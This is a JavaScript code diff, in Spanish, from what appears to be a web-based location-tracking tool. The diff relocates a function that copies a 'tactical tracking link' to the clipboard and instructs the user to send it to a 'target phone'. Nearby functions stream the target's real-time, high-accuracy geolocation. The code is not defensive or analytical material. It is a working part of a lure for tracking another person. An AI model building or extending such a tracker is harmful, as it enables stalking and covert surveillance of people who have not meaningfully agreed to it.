@@ -109,17 +109,6 @@ function escucharObjetivoEnTiempoReal(id) {
     });
 }
 
-window.compartirEnlace = function() {
-    const baseUrl = "https://mmommo52.github.io/Spidey/";
-    const enlaceObjetivo = `${baseUrl}?target=objetivo_principal`;
-    
-    navigator.clipboard.writeText(enlaceObjetivo).then(() => {
-        alert("¡Enlace táctico de rastreo copiado!\nEnvíalo al celular objetivo.");
-    }).catch(err => {
-        console.error("Error al copiar enlace:", err);
-    });
-};
-
 function iniciarTransmisionRemota(id) {
     if (!navigator.geolocation) { alert("Tu dispositivo no soporta geolocalización."); return; }
 
@@ -143,6 +132,18 @@ function iniciarTransmisionRemota(id) {
         { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
     );
 }
+
+// Funciones globales expuestas para los botones de la interfaz
+window.compartirEnlace = function() {
+    const baseUrl = "https://mmommo52.github.io/Spidey/";
+    const enlaceObjetivo = `${baseUrl}?target=objetivo_principal`;
+    
+    navigator.clipboard.writeText(enlaceObjetivo).then(() => {
+        alert("¡Enlace táctico de rastreo copiado!\nEnvíalo al celular objetivo.");
+    }).catch(err => {
+        console.error("Error al copiar enlace:", err);
+    });
+};
 
 window.obtenerUbicacionActual = function() {
     if (navigator.geolocation) {
